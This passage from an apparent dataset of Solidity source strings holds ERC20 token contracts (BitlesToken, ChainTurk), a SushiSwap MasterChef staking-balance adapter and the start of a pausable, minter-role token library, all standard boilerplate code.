*/\n\n    function _mint(address account, uint256 amount) internal virtual {\n\n        require(account != address(0), "ERC20: mint to the zero address");\n\n\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n\n\n        _totalSupply = _totalSupply.add(amount);\n\n        _balances[account] = _balances[account].add(amount);\n\n        emit Transfer(address(0), account, amount);\n\n    }\n\n\n\n    /**\n\n     * @dev Destroys `amount` tokens from `account`, reducing the\n\n     * total supply.\n\n     *\n\n     * Emits a {Transfer} event with `to` set to the zero address.\n\n     *\n\n     * Requirements\n\n     *\n\n     * - `account` cannot be the zero address.\n\n     * - `account` must have at least `amount` tokens.\n\n     */\n\n    function _burn(address account, uint256 amount) internal virtual {\n\n        require(account != address(0), "ERC20: burn from the zero address");\n\n\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n\n\n        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");\n\n        _totalSupply = _totalSupply.sub(amount);\n\n        emit Transfer(account, address(0), amount);\n\n    }\n\n\n\n    /**\n\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\n\n     *\n\n     * This internal function is equivalent to `approve`, and can be used to\n\n     * e.g. set automatic allowances for certain subsystems, etc.\n\n     *\n\n     * Emits an {Approval} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `owner` cannot be the zero address.\n\n     * - `spender` cannot be the zero address.\n\n     */\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n\n        require(owner != address(0), "ERC20: approve from the zero address");\n\n        require(spender != address(0), "ERC20: approve to the zero address");\n\n\n\n        _allowances[owner][spender] = amount;\n\n        emit Approval(owner, spender, amount);\n\n    }\n\n\n\n    /**\n\n     * @dev Sets {decimals} to a value other than the default one of 18.\n\n     *\n\n     * WARNING: This function should only be called from the constructor. Most\n\n     * applications that interact with token contracts will not expect\n\n     * {decimals} to ever change, and may work incorrectly if it does.\n\n     */\n\n    function _setupDecimals(uint8 decimals_) internal {\n\n        _decimals = decimals_;\n\n    }\n\n\n\n    /**\n\n     * @dev Hook that is called before any transfer of tokens. This includes\n\n     * minting and burning.\n\n     *\n\n     * Calling conditions:\n\n     *\n\n     * - when `from` and `to` are both non-zero, `amount` of ``from``\'s tokens\n\n     * will be to transferred to `to`.\n\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\n\n     * - when `to` is zero, `amount` of ``from``\'s tokens will be burned.\n\n     * - `from` and `to` are never both zero.\n\n     *\n\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n\n     */\n\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n\n}\n\ncontract BitlesToken is ERC20 {\n\n\n\n\n\n    constructor () public ERC20("Bitles Token", "BTL") {\n\n\n        _setupDecimals(6);\n\n\n        _mint(msg.sender, 88895678 * (10 ** uint256(decimals())));\n\n\n    }\n\n\n}\n', 'pragma solidity 0.6.5;\npragma experimental ABIEncoderV2;\n\nstruct UserInfo {\n\n    uint256 amount;\n\n    uint256 rewardDebt;\n\n}\n\nstruct PoolInfo {\n\n    address lpToken;\n\n    uint256 allocPoint;\n\n    uint256 lastRewardBlock;\n\n    uint256 accSushiPerShare;\n\n}\n\ninterface ProtocolAdapter {\n\n\n\n    /**\n\n     * @dev MUST return "Asset" or "Debt".\n\n     * SHOULD be implemented by the public constant state variable.\n\n     */\n\n    function adapterType() external pure returns (string memory);\n\n\n\n    /**\n\n     * @dev MUST return token type (default is "ERC20").\n\n     * SHOULD be implemented by the public constant state variable.\n\n     */\n\n    function tokenType() external pure returns (string memory);\n\n\n\n    /**\n\n     * @dev MUST return amount of the given token locked on the protocol by the given account.\n\n     */\n\n    function getBalance(address token, address account) external view returns (uint256);\n\n}\n\ninterface MasterChef {\n\n    function poolLength() external view returns (uint256);\n\n    function poolInfo(uint256) external view returns (PoolInfo memory);\n\n    function userInfo(uint256, address) external view returns (UserInfo memory);\n\n    function pendingSushi(uint256, address) external view returns (uint256);\n\n}\n\ncontract SushiStakingAdapter is ProtocolAdapter {\n\n\n\n    string public constant override adapterType = "Asset";\n\n\n\n    string public constant override tokenType = "ERC20";\n\n\n\n    address internal constant SUSHI = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;\n\n    address internal constant MASTER_CHEF = 0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd;\n\n\n\n    /**\n\n     * @return Amount of SUSHI rewards / staked tokens for a given account.\n\n     * @dev Implementation of ProtocolAdapter interface function.\n\n     */\n\n    function getBalance(address token, address account) external view override returns (uint256) {\n\n        uint256 length = MasterChef(MASTER_CHEF).poolLength();\n\n\n\n        if (token == SUSHI) {\n\n            uint256 totalRewards = 0;\n\n\n\n            for(uint256 i = 0; i < length; i++) {\n\n                totalRewards += MasterChef(MASTER_CHEF).pendingSushi(i, account);\n\n            }\n\n\n\n            return totalRewards;\n\n        } else {\n\n            for(uint256 i = 0; i < length; i++) {\n\n                UserInfo memory user = MasterChef(MASTER_CHEF).userInfo(i, account);\n\n                PoolInfo memory pool = MasterChef(MASTER_CHEF).poolInfo(i);\n\n\n\n                if (pool.lpToken == token) {\n\n                    return user.amount;\n\n                }\n\n            }\n\n\n\n            return 0;\n\n        }\n\n    }\n\n\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        require(b <= a, "SafeMath: subtraction overflow");\n\n        uint256 c = a - b;\n\n\n\n        return c;\n\n    }\n\n\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        // Gas optimization: this is cheaper than requiring \'a\' not being zero, but the\n\n        // benefit is lost if \'b\' is also tested.\n\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n\n        if (a == 0) {\n\n            return 0;\n\n        }\n\n\n\n        uint256 c = a * b;\n\n        require(c / a == b, "SafeMath: multiplication overflow");\n\n\n\n        return c;\n\n    }\n\n}\n', 'pragma solidity 0.6.12;\n\nabstract contract Context {\n\n\n    function _msgSender() internal view virtual returns (address payable) {\n\n\n        return msg.sender;\n\n\n    }\n\n\n\n\n\n    function _msgData() internal view virtual returns (bytes memory) {\n\n\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n\n\n        return msg.data;\n\n\n    }\n\n\n}\n\ninterface IERC20 {\n\n\n    /**\n\n\n     * @dev Returns the amount of tokens in existence.\n\n\n     */\n\n\n    function totalSupply() external view returns (uint256);\n\n\n\n\n\n    /**\n\n\n     * @dev Returns the amount of tokens owned by `account`.\n\n\n     */\n\n\n    function balanceOf(address account) external view returns (uint256);\n\n\n\n\n\n    /**\n\n\n     * @dev Moves `amount` tokens from the caller\'s account to `recipient`.\n\n\n     *\n\n\n     * Returns a boolean value indicating whether the operation succeeded.\n\n\n     *\n\n\n     * Emits a {Transfer} event.\n\n\n     */\n\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n\n\n\n\n    /**\n\n\n     * @dev Returns the remaining number of tokens that `spender` will be\n\n\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n\n\n     * zero by default.\n\n\n     *\n\n\n     * This value changes when {approve} or {transferFrom} are called.\n\n\n     */\n\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n\n\n\n\n    /**\n\n\n     * @dev Sets `amount` as the allowance of `spender` over the caller\'s tokens.\n\n\n     *\n\n\n     * Returns a boolean value indicating whether the operation succeeded.\n\n\n     *\n\n\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n\n\n     * that someone may use both the old and the new allowance by unfortunate\n\n\n     * transaction ordering. One possible solution to mitigate this race\n\n\n     * condition is to first reduce the spender\'s allowance to 0 and set the\n\n\n     * desired value afterwards:\n\n\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n\n\n     *\n\n\n     * Emits an {Approval} event.\n\n\n     */\n\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n\n\n\n\n    /**\n\n\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n\n\n     * allowance mechanism. `amount` is then deducted from the caller\'s\n\n\n     * allowance.\n\n\n     *\n\n\n     * Returns a boolean value indicating whether the operation succeeded.\n\n\n     *\n\n\n     * Emits a {Transfer} event.\n\n\n     */\n\n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n\n\n\n\n    /**\n\n\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n\n\n     * another (`to`).\n\n\n     *\n\n\n     * Note that `value` may be zero.\n\n\n     */\n\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n\n\n\n\n    /**\n\n\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n\n\n     * a call to {approve}. `value` is the new allowance.\n\n\n     */\n\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n\n}\n\nlibrary SafeMath {\n\n\n    /**\n\n\n     * @dev Returns the addition of two unsigned integers, reverting on\n\n\n     * overflow.\n\n\n     *\n\n\n     * Counterpart to Solidity\'s `+` operator.\n\n\n     *\n\n\n     * Requirements:\n\n\n     *\n\n\n     * - Addition cannot overflow.\n\n\n     */\n\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n\n\n        uint256 c = a + b;\n\n\n        require(c >= a, "SafeMath: addition overflow");\n\n\n\n\n\n        return c;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n\n\n     * overflow (when the result is negative).\n\n\n     *\n\n\n     * Counterpart to Solidity\'s `-` operator.\n\n\n     *\n\n\n     * Requirements:\n\n\n     *\n\n\n     * - Subtraction cannot overflow.\n\n\n     */\n\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n\n\n        return sub(a, b, "SafeMath: subtraction overflow");\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n\n\n     * overflow (when the result is negative).\n\n\n     *\n\n\n     * Counterpart to Solidity\'s `-` operator.\n\n\n     *\n\n\n     * Requirements:\n\n\n     *\n\n\n     * - Subtraction cannot overflow.\n\n\n     */\n\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\n\n        require(b <= a, errorMessage);\n\n\n        uint256 c = a - b;\n\n\n\n\n\n        return c;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n\n\n     * overflow.\n\n\n     *\n\n\n     * Counterpart to Solidity\'s `*` operator.\n\n\n     *\n\n\n     * Requirements:\n\n\n     *\n\n\n     * - Multiplication cannot overflow.\n\n\n     */\n\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n\n        // Gas optimization: this is cheaper than requiring \'a\' not being zero, but the\n\n\n        // benefit is lost if \'b\' is also tested.\n\n\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n\n\n        if (a == 0) {\n\n\n            return 0;\n\n\n        }\n\n\n\n\n\n        uint256 c = a * b;\n\n\n        require(c / a == b, "SafeMath: multiplication overflow");\n\n\n\n\n\n        return c;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Returns the integer division of two unsigned integers. Reverts on\n\n\n     * division by zero. The result is rounded towards zero.\n\n\n     *\n\n\n     * Counterpart to Solidity\'s `/` operator. Note: this function uses a\n\n\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n\n\n     * uses an invalid opcode to revert (consuming all remaining gas).\n\n\n     *\n\n\n     * Requirements:\n\n\n     *\n\n\n     * - The divisor cannot be zero.\n\n\n     */\n\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n\n\n        return div(a, b, "SafeMath: division by zero");\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n\n\n     * division by zero. The result is rounded towards zero.\n\n\n     *\n\n\n     * Counterpart to Solidity\'s `/` operator. Note: this function uses a\n\n\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n\n\n     * uses an invalid opcode to revert (consuming all remaining gas).\n\n\n     *\n\n\n     * Requirements:\n\n\n     *\n\n\n     * - The divisor cannot be zero.\n\n\n     */\n\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\n\n        require(b > 0, errorMessage);\n\n\n        uint256 c = a / b;\n\n\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\n\n\n\n\n\n        return c;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n\n\n     * Reverts when dividing by zero.\n\n\n     *\n\n\n     * Counterpart to Solidity\'s `%` operator. This function uses a `revert`\n\n\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n\n\n     * invalid opcode to revert (consuming all remaining gas).\n\n\n     *\n\n\n     * Requirements:\n\n\n     *\n\n\n     * - The divisor cannot be zero.\n\n\n     */\n\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n\n\n        return mod(a, b, "SafeMath: modulo by zero");\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n\n\n     * Reverts with custom message when dividing by zero.\n\n\n     *\n\n\n     * Counterpart to Solidity\'s `%` operator. This function uses a `revert`\n\n\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n\n\n     * invalid opcode to revert (consuming all remaining gas).\n\n\n     *\n\n\n     * Requirements:\n\n\n     *\n\n\n     * - The divisor cannot be zero.\n\n\n     */\n\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\n\n        require(b != 0, errorMessage);\n\n\n        return a % b;\n\n\n    }\n\n\n}\n\ncontract ChainTurk is Context, IERC20 {\n\n\n    using SafeMath for uint256;\n\n\n\n\n\n    mapping (address => uint256) private _balances;\n\n\n    mapping (address => mapping (address => uint256)) private _allowances;\n\n\n\n\n\n    uint256 private _totalSupply;\n\n\n\n\n\n    string private _name;\n\n\n    string private _symbol;\n\n\n    uint8 private _decimals;\n\n\n\n\n\n    /**\n\n\n     * @dev Sets the values for {name} and {symbol}, initializes {decimals} with\n\n\n     * a default value of 18.\n\n\n     *\n\n\n     * To select a different value for {decimals}, use {_setupDecimals}.\n\n\n     *\n\n\n     * All three of these values are immutable: they can only be set once during\n\n\n     * construction.\n\n\n     */\n\n\n    constructor (string memory name, string memory symbol, uint256 totalSupply) public {\n\n\n        _name = name;\n\n\n        _symbol = symbol;\n\n\n        _decimals = 2;\n\n\n        _totalSupply = totalSupply;\n\n\n        _balances[msg.sender] = totalSupply;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Returns the name of the token.\n\n\n     */\n\n\n    function name() public view returns (string memory) {\n\n\n        return _name;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Returns the symbol of the token, usually a shorter version of the\n\n\n     * name.\n\n\n     */\n\n\n    function symbol() public view returns (string memory) {\n\n\n        return _symbol;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Returns the number of decimals used to get its user representation.\n\n\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n\n\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\n\n\n     *\n\n\n     * Tokens usually opt for a value of 18, imitating the relationship between\n\n\n     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is\n\n\n     * called.\n\n\n     *\n\n\n     * NOTE: This information is only used for _display_ purposes: it in\n\n\n     * no way affects any of the arithmetic of the contract, including\n\n\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n\n\n     */\n\n\n    function decimals() public view returns (uint8) {\n\n\n        return _decimals;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev See {IERC20-totalSupply}.\n\n\n     */\n\n\n    function totalSupply() public view override returns (uint256) {\n\n\n        return _totalSupply;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev See {IERC20-balanceOf}.\n\n\n     */\n\n\n    function balanceOf(address account) public view override returns (uint256) {\n\n\n        return _balances[account];\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev See {IERC20-transfer}.\n\n\n     *\n\n\n     * Requirements:\n\n\n     *\n\n\n     * - `recipient` cannot be the zero address.\n\n\n     * - the caller must have a balance of at least `amount`.\n\n\n     */\n\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n\n\n        _transfer(_msgSender(), recipient, amount);\n\n\n        return true;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev See {IERC20-allowance}.\n\n\n     */\n\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n\n\n        return _allowances[owner][spender];\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev See {IERC20-approve}.\n\n\n     *\n\n\n     * Requirements:\n\n\n     *\n\n\n     * - `spender` cannot be the zero address.\n\n\n     */\n\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n\n\n        _approve(_msgSender(), spender, amount);\n\n\n        return true;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev See {IERC20-transferFrom}.\n\n\n     *\n\n\n     * Emits an {Approval} event indicating the updated allowance. This is not\n\n\n     * required by the EIP. See the note at the beginning of {ERC20}.\n\n\n     *\n\n\n     * Requirements:\n\n\n     *\n\n\n     * - `sender` and `recipient` cannot be the zero address.\n\n\n     * - `sender` must have a balance of at least `amount`.\n\n\n     * - the caller must have allowance for ``sender``\'s tokens of at least\n\n\n     * `amount`.\n\n\n     */\n\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n\n\n        _transfer(sender, recipient, amount);\n\n\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));\n\n\n        return true;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n\n\n     *\n\n\n     * This is an alternative to {approve} that can be used as a mitigation for\n\n\n     * problems described in {IERC20-approve}.\n\n\n     *\n\n\n     * Emits an {Approval} event indicating the updated allowance.\n\n\n     *\n\n\n     * Requirements:\n\n\n     *\n\n\n     * - `spender` cannot be the zero address.\n\n\n     */\n\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n\n\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n\n\n        return true;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n\n\n     *\n\n\n     * This is an alternative to {approve} that can be used as a mitigation for\n\n\n     * problems described in {IERC20-approve}.\n\n\n     *\n\n\n     * Emits an {Approval} event indicating the updated allowance.\n\n\n     *\n\n\n     * Requirements:\n\n\n     *\n\n\n     * - `spender` cannot be the zero address.\n\n\n     * - `spender` must have allowance for the caller of at least\n\n\n     * `subtractedValue`.\n\n\n     */\n\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n\n\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));\n\n\n        return true;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\n\n\n     *\n\n\n     * This is internal function is equivalent to {transfer}, and can be used to\n\n\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n\n\n     *\n\n\n     * Emits a {Transfer} event.\n\n\n     *\n\n\n     * Requirements:\n\n\n     *\n\n\n     * - `sender` cannot be the zero address.\n\n\n     * - `recipient` cannot be the zero address.\n\n\n     * - `sender` must have a balance of at least `amount`.\n\n\n     */\n\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n\n\n        require(sender != address(0), "ERC20: transfer from the zero address");\n\n\n        require(recipient != address(0), "ERC20: transfer to the zero address");\n\n\n\n\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n\n\n\n\n        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");\n\n\n        _balances[recipient] = _balances[recipient].add(amount);\n\n\n        emit Transfer(sender, recipient, amount);\n\n\n    }\n\n\n\n\n\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n\n\n     * the total supply.\n\n\n     *\n\n\n     * Emits a {Transfer} event with `from` set to the zero address.\n\n\n     *\n\n\n     * Requirements:\n\n\n     *\n\n\n     * - `to` cannot be the zero address.\n\n\n     */\n\n\n    function _mint(address account, uint256 amount) internal virtual {\n\n\n        require(account != address(0), "ERC20: mint to the zero address");\n\n\n\n\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n\n\n\n\n        _totalSupply = _totalSupply.add(amount);\n\n\n        _balances[account] = _balances[account].add(amount);\n\n\n        emit Transfer(address(0), account, amount);\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Destroys `amount` tokens from `account`, reducing the\n\n\n     * total supply.\n\n\n     *\n\n\n     * Emits a {Transfer} event with `to` set to the zero address.\n\n\n     *\n\n\n     * Requirements:\n\n\n     *\n\n\n     * - `account` cannot be the zero address.\n\n\n     * - `account` must have at least `amount` tokens.\n\n\n     */\n\n\n    function _burn(address account, uint256 amount) internal virtual {\n\n\n        require(account != address(0), "ERC20: burn from the zero address");\n\n\n\n\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n\n\n\n\n        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");\n\n\n        _totalSupply = _totalSupply.sub(amount);\n\n\n        emit Transfer(account, address(0), amount);\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\n\n\n     *\n\n\n     * This internal function is equivalent to `approve`, and can be used to\n\n\n     * e.g. set automatic allowances for certain subsystems, etc.\n\n\n     *\n\n\n     * Emits an {Approval} event.\n\n\n     *\n\n\n     * Requirements:\n\n\n     *\n\n\n     * - `owner` cannot be the zero address.\n\n\n     * - `spender` cannot be the zero address.\n\n\n     */\n\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n\n\n        require(owner != address(0), "ERC20: approve from the zero address");\n\n\n        require(spender != address(0), "ERC20: approve to the zero address");\n\n\n\n\n\n        _allowances[owner][spender] = amount;\n\n\n        emit Approval(owner, spender, amount);\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Sets {decimals} to a value other than the default one of 18.\n\n\n     *\n\n\n     * WARNING: This function should only be called from the constructor. Most\n\n\n     * applications that interact with token contracts will not expect\n\n\n     * {decimals} to ever change, and may work incorrectly if it does.\n\n\n     */\n\n\n    function _setupDecimals(uint8 decimals_) internal {\n\n\n        _decimals = decimals_;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Hook that is called before any transfer of tokens. This includes\n\n\n     * minting and burning.\n\n\n     *\n\n\n     * Calling conditions:\n\n\n     *\n\n\n     * - when `from` and `to` are both non-zero, `amount` of ``from``\'s tokens\n\n\n     * will be to transferred to `to`.\n\n\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\n\n\n     * - when `to` is zero, `amount` of ``from``\'s tokens will be burned.\n\n\n     * - `from` and `to` are never both zero.\n\n\n     *\n\n\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n\n\n     */\n\n\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n\n\n}\n', "pragma solidity 0.5.7;\n\nlibrary Roles {\n\n\n    struct Role {\n\n\n        mapping (address => bool) bearer;\n\n\n    }\n\n\n\n\n\n    function add(Role storage role, address account) internal {\n\n\n        require(account != address(0));\n\n\n        require(!has(role, account));\n\n\n\n\n\n        role.bearer[account] = true;\n\n\n    }\n\n\n\n\n\n    function remove(Role storage role, address account) internal {\n\n\n        require(account != address(0));\n\n\n        require(has(role, account));\n\n\n\n\n\n        role.bearer[account] = false;\n\n\n    }\n\n\n\n\n\n    function has(Role storage role, address account) internal view returns (bool) {\n\n\n        require(account != address(0));\n\n\n        return role.bearer[account];\n\n\n    }\n\n\n}\n\ncontract MinterRole {\n\n\n    using Roles for Roles.Role;\n\n\n\n\n\n    event MinterAdded(address indexed account);\n\n\n    event MinterRemoved(address indexed account);\n\n\n\n\n\n    Roles.Role private _minters;\n\n\n\n\n\n    constructor () internal {\n\n\n        _addMinter(msg.sender);\n\n\n    }\n\n\n\n\n\n    modifier onlyMinter() {\n\n\n        require(isMinter(msg.sender));\n\n\n        _;\n\n\n    }\n\n\n\n\n\n    function isMinter(address account) public view returns (bool) {\n\n\n        return _minters.has(account);\n\n\n    }\n\n\n\n\n\n    function addMinter(address account) public onlyMinter {\n\n\n        _addMinter(account);\n\n\n    }\n\n\n\n\n\n    function renounceMinter() public {\n\n\n        _removeMinter(msg.sender);\n\n\n    }\n\n\n\n\n\n    function _addMinter(address account) internal {\n\n\n        _minters.add(account);\n\n\n        emit MinterAdded(account);\n\n\n    }\n\n\n\n\n\n    function _removeMinter(address account) internal {\n\n\n        _minters.remove(account);\n\n\n        emit MinterRemoved(account);\n\n\n    }\n\n\n}\n\ncontract PauserRole {\n\n\n    using Roles for Roles.Role;\n\n\n\n\n\n    event PauserAdded(address indexed account);\n\n\n    event PauserRemoved(address indexed account);\n\n\n\n\n\n    Roles.Role private _pausers;\n\n\n\n\n\n    constructor () internal {\n\n\n        _addPauser(msg.sender);\n\n\n    }\n\n\n\n\n\n    modifier onlyPauser() {\n\n\n        require(isPauser(msg.sender));\n\n\n        _;\n\n\n    }\n\n\n\n\n\n    function isPauser(address account) public view returns (bool) {\n\n\n        return _pausers.has(account);\n\n\n    }\n\n\n\n\n\n    function addPauser(address account) public onlyPauser {\n\n\n        _addPauser(account);\n\n\n    }\n\n\n\n\n\n    function renouncePauser() public {\n\n\n        _removePauser(msg.sender);\n\n\n    }\n\n\n\n\n\n    function _addPauser(address account) internal {\n\n\n        _pausers.add(account);\n\n\n        emit PauserAdded(account);\n\n\n    }\n\n\n\n\n\n    function _removePauser(address account) internal {\n\n\n        _pausers.remove(account);\n\n\n        emit PauserRemoved(account);\n\n\n    }\n\n\n}\n\ncontract Pausable is PauserRole {\n\n\n    event Paused(address account);\n\n\n    event Unpaused(address account);\n\n\n\n\n\n    bool private _pausableActive;\n\n\n    bool private _paused;\n\n\n\n\n\n    constructor () internal {\n\n\n        _paused = false;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @return true if the contract is paused, false otherwise.\n\n\n     */\n\n\n    function paused() public view returns (bool) {\n\n\n        return _paused;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Modifier to make a function callable only when the contract is not paused.\n\n\n     */\n\n\n    modifier whenNotPaused() {\n\n\n        require(!_paused);\n\n\n        _;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Modifier to make a function callable only when the contract is paused.\n\n\n     */\n\n\n    modifier whenPaused() {\n\n\n        require(_paused);\n\n\n        _;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev called by the owner to pause, triggers stopped state\n\n\n     */\n\n\n    function pause() public onlyPauser whenNotPaused whenPausableActive {\n\n\n        _paused = true;\n\n\n        emit Paused(msg.sender);\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev called by the owner to unpause, returns to normal state\n\n\n     */\n\n\n    function unpause() public onlyPauser whenPaused whenPausableActive {\n\n\n        _paused = false;\n\n\n        emit Unpaused(msg.sender);\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Options to activate or deactivate Pausable ability\n\n\n     */\n\n\n\n\n\n    function _setPausableActive(bool _active) internal {\n\n\n        _pausableActive = _active;\n\n\n    }\n\n\n\n\n\n    modifier whenPausableActive() {\n\n\n        require(_pausableActive);\n\n\n        _;\n\n\n    }\n\n\n\n\n\n}\n\ninterface IERC20 {\n\n\n    function totalSupply() external view returns (uint256);\n\n\n\n\n\n    function balanceOf(address who) external view returns (uint256);\n\n\n\n\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n\n\n\n\n    function transfer(address to, uint256 value) external returns (bool);\n\n\n\n\n\n    function approve(address spender, uint256 value) external returns (bool);\n\n\n\n\n\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n\n\n\n\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n\n\n\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n\n}\n\nlibrary SafeMath {\n\n\n    \n\n\n    int256 constant private INT256_MIN = -2**255;\n\n\n\n\n\n    /**\n\n\n    * @dev Multiplies two unsigned integers, reverts on overflow.\n\n\n    */\n\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n\n\n        // benefit is lost if 'b' is also tested.\n\n\n        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522\n\n\n        if (a == 0) {\n\n\n            return 0;\n\n\n        }\n\n\n\n\n\n        uint256 c = a * b;\n\n\n        require(c / a == b);\n\n\n\n\n\n        return c;\n\n\n    }\n\n\n\n\n\n    function mul(int256 a, int256 b) internal pure returns (int256) {\n\n\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n\n\n        // benefit is lost if 'b' is also tested.\n\n\n        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522\n\n\n        if (a == 0) {\n\n\n            return 0;\n\n\n        }\n\n\n\n\n\n        require(!(a == -1 && b == INT256_MIN)); // This is the only case of overflow not detected by the check below\n\n\n\n\n\n        int256 c = a * b;\n\n\n        require(c / a == b);\n\n\n\n\n\n        return c;\n\n\n    }\n\n\n\n\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n\n\n        // Solidity only automatically asserts when dividing by 0\n\n\n        require(b > 0);\n\n\n        uint256 c = a / b;\n\n\n        // 